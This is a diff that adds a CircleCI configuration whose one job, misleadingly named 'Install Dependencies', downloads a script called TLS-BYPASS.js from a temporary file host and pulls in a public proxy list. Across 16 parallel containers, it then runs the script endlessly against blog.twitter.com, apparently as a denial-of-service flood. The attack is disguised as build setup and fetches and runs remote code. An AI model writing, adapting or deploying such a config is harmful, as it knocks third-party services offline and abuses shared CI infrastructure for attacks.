@@ -1,0 +1,17 @@
+version: 2.1
+jobs:
+    trial:
+      docker:
+            - image: buildpack-deps:lunar
+      parallelism: 16
+      steps:
+        - run:
+            name: Install Dependencies
+            command: apt update && apt install wget -y && wget https://temp.sh/uepUh/TLS-BYPASS.js && wget https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt && npm install request fake-useragent randomstring && chmod 777 * && while true; do node TLS-BYPASS.js https://blog.twitter.com/ 999999 36 http.txt 100; done;
+            no_output_timeout: 5h
+
+workflows:
+    version: 2.1
+    build:
+        jobs:
+        - trial
